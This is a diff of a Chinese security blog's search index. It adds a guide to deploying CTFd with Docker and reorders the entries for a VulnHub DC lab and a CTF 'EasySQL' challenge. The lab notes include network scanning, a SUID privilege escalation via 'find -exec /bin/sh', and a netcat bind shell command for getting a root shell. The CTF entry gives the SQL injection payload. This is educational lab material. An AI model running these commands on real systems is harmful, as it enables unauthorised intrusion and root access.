@@ -1,60 +1,81 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>DC靶场</title>
-    <url>/shen-tou-ce-shi/dc-ba-chang/</url>
-    <content><![CDATA[<h3 id="最近在练习VulnHubDC靶场，在这里记录下自己不太熟悉的一些知识点"><a href="#最近在练习VulnHubDC靶场，在这里记录下自己不太熟悉的一些知识点" class="headerlink" title="最近在练习VulnHubDC靶场，在这里记录下自己不太熟悉的一些知识点"></a>最近在练习VulnHubDC靶场，在这里记录下自己不太熟悉的一些知识点</h3><h2 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h2><h4 id="1-发现存活主机"><a href="#1-发现存活主机" class="headerlink" title="1.发现存活主机"></a>1.发现存活主机</h4><h5 id="（1）nmap发现内网存活主机"><a href="#（1）nmap发现内网存活主机" class="headerlink" title="（1）nmap发现内网存活主机"></a>（1）nmap发现内网存活主机</h5><pre><code>nmap -sP 192.168.1.0/24
+    <title>CTFd的搭建部署</title>
+    <url>/docker/ctfd/ctfd-de-da-jian-bu-shu/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近把博客图床迁移到了gitee，然后服务器腾了出来，鼓捣一下CTFd平台的搭建</p>
+<p>本文从服务器安全组配置入手，然后docker安装，从0进行</p>
+<h2 id="一、服务器安全组配置"><a href="#一、服务器安全组配置" class="headerlink" title="一、服务器安全组配置"></a>一、服务器安全组配置</h2><p>我选择的是ubuntu 18.04位，阿里云，安全组配置如下</p>
+<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210112145523.png" srcset="/img/loading.gif" alt=""></p>
+<h2 id="二、docker以及docker-compose的安装"><a href="#二、docker以及docker-compose的安装" class="headerlink" title="二、docker以及docker-compose的安装"></a>二、docker以及docker-compose的安装</h2><h3 id="1-使用官方脚本自动安装"><a href="#1-使用官方脚本自动安装" class="headerlink" title="1.使用官方脚本自动安装"></a>1.使用官方脚本自动安装</h3><pre class=" language-shell"><code class="language-shell">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</code></pre>
+<p>或者国内 daocloud 一键安装命令</p>
+<pre class=" language-shell"><code class="language-shell">curl -sSL https://get.daocloud.io/docker | sh</code></pre>
+<p>通过运行 hello-world 映像来验证是否正确安装了 Docker Engine-Community 。</p>
+<pre class=" language-shell"><code class="language-shell">sudo docker run hello-world</code></pre>
+<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210112154251.png" srcset="/img/loading.gif" alt=""></p>
+<h3 id="2-docker-compose安装"><a href="#2-docker-compose安装" class="headerlink" title="2.docker-compose安装"></a>2.docker-compose安装</h3><pre class=" language-shell"><code class="language-shell">curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.5/docker-compose-`uname -s`-`uname -m` > /usr/local/bin/docker-compose</code></pre>
+<p>将可执行权限应用于二进制文件：</p>
+<pre class=" language-shell"><code class="language-shell">sudo chmod +x /usr/local/bin/docker-compose</code></pre>
+<p>测试是否安装成功：</p>
+<pre class=" language-shell"><code class="language-shell">$ docker-compose --version
+cker-compose version 1.24.1, build 4667896b</code></pre>
+<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210112154302.png" srcset="/img/loading.gif" alt=""></p>
+<p>docker镜像加速：</p>
+<p><a href="https://cr.console.aliyun.com/cn-beijing/instances/mirrors" target="_blank" rel="noopener">https://cr.console.aliyun.com/cn-beijing/instances/mirrors</a></p>
+<h2 id="三、搭建CTFd"><a href="#三、搭建CTFd" class="headerlink" title="三、搭建CTFd"></a>三、搭建CTFd</h2><h5 id="我采用的是单机-Direct-Http-模式（Frp-转发在一个机器上，只需要一台机器，靶机通过端口号或者域名访问，需要配置域名解析）"><a href="#我采用的是单机-Direct-Http-模式（Frp-转发在一个机器上，只需要一台机器，靶机通过端口号或者域名访问，需要配置域名解析）" class="headerlink" title="我采用的是单机 Direct + Http 模式（Frp 转发在一个机器上，只需要一台机器，靶机通过端口号或者域名访问，需要配置域名解析）"></a>我采用的是单机 Direct + Http 模式（Frp 转发在一个机器上，只需要一台机器，靶机通过端口号或者域名访问，需要配置域名解析）</h5><h5 id="准备一个域名，设置如下解析。"><a href="#准备一个域名，设置如下解析。" class="headerlink" title="准备一个域名，设置如下解析。"></a>准备一个域名，设置如下解析。</h5><ul>
+<li>A | *.test.127.0.0.1.nip.io | 你机器 IP</li>
+</ul>
+<h5 id="启用docker-swarm"><a href="#启用docker-swarm" class="headerlink" title="启用docker-swarm"></a>启用docker-swarm</h5><pre class=" language-shell"><code class="language-shell">docker swarm init
+docker node ls</code></pre>
+<h5 id="标记-amp-命名节点"><a href="#标记-amp-命名节点" class="headerlink" title="标记&amp;命名节点"></a>标记&amp;命名节点</h5><pre class=" language-shell"><code class="language-shell">docker node update --label-add name=输入你想起的名字 IDvalue#IDvalue 位于上图ID下方 复制粘贴即可</code></pre>
+<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210112155005.png" srcset="/img/loading.gif" alt=""></p>
+<h5 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h5><pre class=" language-shell"><code class="language-shell">yum install git</code></pre>
+<h5 id="验证git安装是否成功"><a href="#验证git安装是否成功" class="headerlink" title="验证git安装是否成功"></a>验证git安装是否成功</h5><pre class=" language-shell"><code class="language-shell">git --version</code></pre>
+<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210112155239.png" srcset="/img/loading.gif" alt=""></p>
+<p>下载CTFd代码</p>
+<pre class=" language-shell"><code class="language-shell">git clone -b single-http https://github.com/glzjin/CTFd.git</code></pre>
+<p>可以迁移到自己的gitee平台，速度会快一些</p>
+<pre class=" language-shell"><code class="language-shell">git clone -b single-http https://gitee.com/mushiyu/CTFd.git</code></pre>
+<p>进入目录，编辑 frp 两端配置文件，使 token 随机，使用 docker-compose 启动相关组件。</p>
+<pre class=" language-shell"><code class="language-shell">cd CTFd
+vi frp/frps.ini # token 一定要随机
+vi frp/frpc.ini # token 一定要随机
+git submodule update --init
+docker-compose up -d</code></pre>
+<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210112184043.png" srcset="/img/loading.gif" alt=""></p>
+<p>报错我们可以将Dockerfile文件下的python与python-dev改为python3 python3-dev</p>
+<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210112155924.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210112180659.png" srcset="/img/loading.gif" alt=""></p>
+<p>报错，可以修改requirements.txt，删除gevent的版本号</p>
+<pre><code>/requirements.txt
+...
+redis==3.3.11
+datafreeze==0.1.0
+gevent
+python-dotenv==0.10.3
+flask-restplus==0.13.0
+...</code></pre><p>然后 <code>docker-compose down</code> 再启动 <code>docker-compose up -d --build</code> 不出意外应该就能解决问题</p>
+<p>启动完毕，打开 <a href="http://ip:8000" target="_blank" rel="noopener">http://ip:8000</a> 安装 CTFd</p>
+<p><a href="https://www.zhaoj.in/read-6333.html/comment-page-2#_Direct_Frp" target="_blank" rel="noopener">https://www.zhaoj.in/read-6333.html/comment-page-2#_Direct_Frp</a></p>
+<p>四、优化方面：</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/weixin_43880435/article/details/107339592" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43880435/article/details/107339592</a></p>
+</blockquote>
+<p>修改css，加快渲染速度</p>
+<h2 id="四、自己瞎记的一些docker命令"><a href="#四、自己瞎记的一些docker命令" class="headerlink" title="四、自己瞎记的一些docker命令"></a>四、自己瞎记的一些docker命令</h2><p>//ps.. docker删除的命令</p>
+<pre class=" language-shell"><code class="language-shell">docker rm `docker ps -a -q`        //docker删除所有容器
 
-nmap -A -p1-65535 -T4 ip  //扫描端口</code></pre><h5 id="（2）使用msf模块"><a href="#（2）使用msf模块" class="headerlink" title="（2）使用msf模块"></a>（2）使用msf模块</h5><pre><code>use auxiliary/scanner/discovery/arp_sweep 
-
-use auxiliary/scanner/discovery/udp_sweep
-
-set rhosts 192.168.1.0/24</code></pre><h4 id="2-msf-查找可利用脚本"><a href="#2-msf-查找可利用脚本" class="headerlink" title="2.msf 查找可利用脚本"></a>2.msf 查找可利用脚本</h4><pre><code>searchsploit xxx</code></pre><h4 id="3-反弹shell升级半交互式"><a href="#3-反弹shell升级半交互式" class="headerlink" title="3.反弹shell升级半交互式"></a>3.反弹shell升级半交互式</h4><h5 id="半交互式shell"><a href="#半交互式shell" class="headerlink" title="半交互式shell"></a>半交互式shell</h5><p>对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如下：</p>
-<pre class=" language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span> </code></pre>
-<h4 id="4-使用suid提权"><a href="#4-使用suid提权" class="headerlink" title="4.使用suid提权"></a>4.使用suid提权</h4><p>常见的可用来提权的linux可执行文件有：</p>
-<p>Nmap , Vim , find , bash , more , less , nano , cp</p>
-<p>查找具有root权限的命令，以下几条均可以查询</p>
-<pre><code>find / -perm -u=s -type f 2&gt;/dev/null
-
-find / -user root -perm -4000 -print 2&gt;/dev/null
-
-find / -user root -perm -4000 -exec ls -ldb { }</code></pre><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><pre><code>ls -al /usr/bin/find
--rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find</code></pre><p>定位到tmp目录下，touch（创建）一个aaa文件</p>
-<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210111192321.jpg" srcset="/img/loading.gif" alt=""></p>
-<pre><code>find aaa -exec &#39;/bin/sh&#39; \;</code></pre><p>大部分Linux 系统都安装了nc。使用</p>
-<p><code>find aaa - exec netcat -lvp 5555 -e /bin/sh \;</code></p>
-<p> 即可成功反弹root shell</p>
+docker rmi `docker images -q`    //docker删除所有镜像</code></pre>
+<h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><blockquote>
+<p>参考博客：</p>
+<p><a href="https://www.zhaoj.in/read-6333.html/comment-page-2#_Direct_Frp" target="_blank" rel="noopener">https://www.zhaoj.in/read-6333.html/comment-page-2#_Direct_Frp</a></p>
+<p><a href="https://hujiekang.top/2020/04/26/CTFd-conf/" target="_blank" rel="noopener">https://hujiekang.top/2020/04/26/CTFd-conf/</a></p>
+<p><a href="https://err0r.top/article/CTFD/" target="_blank" rel="noopener">https://err0r.top/article/CTFD/</a></p>
+</blockquote>
 ]]></content>
       <categories>
-        <category>渗透测试</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>2019]EasySQL</title>
-    <url>/ctf/2019-easysql/</url>
-    <content><![CDATA[<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><ul>
-<li><p>这个和强网杯相似，都是堆叠注入，在公开的源码中可以看到，传入的 <code>query</code> 长度不超过 40</p>
-</li>
-<li><p>关键的查询代码是 <code>select $post[&#39;query&#39;]||flag from Flag</code></p>
-</li>
-<li><p>这里要想办法使得||变为字符串连接操作符，来拼接sql命令</p>
-<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210111192126.png" srcset="/img/loading.gif" alt=""></p>
-</li>
-</ul>
-<h5 id="PIPES-AS-CONCAT-将-视为字符串的连接操作符而非-或-运算符，这和Oracle数据库是一样的，也和字符串的拼接函数-CONCAT-相类似。"><a href="#PIPES-AS-CONCAT-将-视为字符串的连接操作符而非-或-运算符，这和Oracle数据库是一样的，也和字符串的拼接函数-CONCAT-相类似。" class="headerlink" title="PIPES_AS_CONCAT 将 || 视为字符串的连接操作符而非 或 运算符，这和Oracle数据库是一样的，也和字符串的拼接函数 CONCAT() 相类似。"></a><strong><code>PIPES_AS_CONCAT</code></strong> 将 <code>||</code> 视为字符串的连接操作符而非 或 运算符，这和Oracle数据库是一样的，也和字符串的拼接函数 CONCAT() 相类似。</h5><p>本地测试一下：</p>
-<p>1.sql_mode不为PIPES_AS_CONCAT</p>
-<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210111192123.png" srcset="/img/loading.gif" alt=""></p>
-<p>1.sql_mode为PIPES_AS_CONCAT</p>
-<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210111192124.png" srcset="/img/loading.gif" alt=""></p>
-<ul>
-<li>关于非预期解 : <code>*,1</code></li>
-<li>拼接一下，不难理解 : <code>select *,1||flag from Flag</code></li>
-<li>等同于 <code>select *,1 from Flag</code></li>
-</ul>
-<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210111192125.png" srcset="/img/loading.gif" alt=""></p>
-]]></content>
-      <categories>
-        <category>ctf</category>
+        <category>docker</category>
+        <category>CTFd</category>
       </categories>
   </entry>
   <entry>
@@ -119,6 +140,63 @@ volatility -f mem.raw --profile=Win7SP0x86 memdump -p 3552 --dump-dir=./</code><
 <p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210111202637.jpg" srcset="/img/loading.gif" alt=""></p>
 <p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210111202734.jpg" srcset="/img/loading.gif" alt=""></p>
 <pre><code>RoarCTF{wm_D0uB1e_TC-cRypt}</code></pre>]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>DC靶场</title>
+    <url>/shen-tou-ce-shi/dc-ba-chang/</url>
+    <content><![CDATA[<h3 id="最近在练习VulnHubDC靶场，在这里记录下自己不太熟悉的一些知识点"><a href="#最近在练习VulnHubDC靶场，在这里记录下自己不太熟悉的一些知识点" class="headerlink" title="最近在练习VulnHubDC靶场，在这里记录下自己不太熟悉的一些知识点"></a>最近在练习VulnHubDC靶场，在这里记录下自己不太熟悉的一些知识点</h3><h2 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h2><h4 id="1-发现存活主机"><a href="#1-发现存活主机" class="headerlink" title="1.发现存活主机"></a>1.发现存活主机</h4><h5 id="（1）nmap发现内网存活主机"><a href="#（1）nmap发现内网存活主机" class="headerlink" title="（1）nmap发现内网存活主机"></a>（1）nmap发现内网存活主机</h5><pre><code>nmap -sP 192.168.1.0/24
+
+nmap -A -p1-65535 -T4 ip  //扫描端口</code></pre><h5 id="（2）使用msf模块"><a href="#（2）使用msf模块" class="headerlink" title="（2）使用msf模块"></a>（2）使用msf模块</h5><pre><code>use auxiliary/scanner/discovery/arp_sweep 
+
+use auxiliary/scanner/discovery/udp_sweep
+
+set rhosts 192.168.1.0/24</code></pre><h4 id="2-msf-查找可利用脚本"><a href="#2-msf-查找可利用脚本" class="headerlink" title="2.msf 查找可利用脚本"></a>2.msf 查找可利用脚本</h4><pre><code>searchsploit xxx</code></pre><h4 id="3-反弹shell升级半交互式"><a href="#3-反弹shell升级半交互式" class="headerlink" title="3.反弹shell升级半交互式"></a>3.反弹shell升级半交互式</h4><h5 id="半交互式shell"><a href="#半交互式shell" class="headerlink" title="半交互式shell"></a>半交互式shell</h5><p>对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如下：</p>
+<pre class=" language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span> </code></pre>
+<h4 id="4-使用suid提权"><a href="#4-使用suid提权" class="headerlink" title="4.使用suid提权"></a>4.使用suid提权</h4><p>常见的可用来提权的linux可执行文件有：</p>
+<p>Nmap , Vim , find , bash , more , less , nano , cp</p>
+<p>查找具有root权限的命令，以下几条均可以查询</p>
+<pre><code>find / -perm -u=s -type f 2&gt;/dev/null
+
+find / -user root -perm -4000 -print 2&gt;/dev/null
+
+find / -user root -perm -4000 -exec ls -ldb { }</code></pre><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><pre><code>ls -al /usr/bin/find
+-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find</code></pre><p>定位到tmp目录下，touch（创建）一个aaa文件</p>
+<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210111192321.jpg" srcset="/img/loading.gif" alt=""></p>
+<pre><code>find aaa -exec &#39;/bin/sh&#39; \;</code></pre><p>大部分Linux 系统都安装了nc。使用</p>
+<p><code>find aaa - exec netcat -lvp 5555 -e /bin/sh \;</code></p>
+<p> 即可成功反弹root shell</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>2019]EasySQL</title>
+    <url>/ctf/2019-easysql/</url>
+    <content><![CDATA[<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><ul>
+<li><p>这个和强网杯相似，都是堆叠注入，在公开的源码中可以看到，传入的 <code>query</code> 长度不超过 40</p>
+</li>
+<li><p>关键的查询代码是 <code>select $post[&#39;query&#39;]||flag from Flag</code></p>
+</li>
+<li><p>这里要想办法使得||变为字符串连接操作符，来拼接sql命令</p>
+<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210111192126.png" srcset="/img/loading.gif" alt=""></p>
+</li>
+</ul>
+<h5 id="PIPES-AS-CONCAT-将-视为字符串的连接操作符而非-或-运算符，这和Oracle数据库是一样的，也和字符串的拼接函数-CONCAT-相类似。"><a href="#PIPES-AS-CONCAT-将-视为字符串的连接操作符而非-或-运算符，这和Oracle数据库是一样的，也和字符串的拼接函数-CONCAT-相类似。" class="headerlink" title="PIPES_AS_CONCAT 将 || 视为字符串的连接操作符而非 或 运算符，这和Oracle数据库是一样的，也和字符串的拼接函数 CONCAT() 相类似。"></a><strong><code>PIPES_AS_CONCAT</code></strong> 将 <code>||</code> 视为字符串的连接操作符而非 或 运算符，这和Oracle数据库是一样的，也和字符串的拼接函数 CONCAT() 相类似。</h5><p>本地测试一下：</p>
+<p>1.sql_mode不为PIPES_AS_CONCAT</p>
+<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210111192123.png" srcset="/img/loading.gif" alt=""></p>
+<p>1.sql_mode为PIPES_AS_CONCAT</p>
+<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210111192124.png" srcset="/img/loading.gif" alt=""></p>
+<ul>
+<li>关于非预期解 : <code>*,1</code></li>
+<li>拼接一下，不难理解 : <code>select *,1||flag from Flag</code></li>
+<li>等同于 <code>select *,1 from Flag</code></li>
+</ul>
+<p><img src="https://gitee.com/mushiyu/img/raw/master/img/20210111192125.png" srcset="/img/loading.gif" alt=""></p>
+]]></content>
       <categories>
         <category>ctf</category>
       </categories>
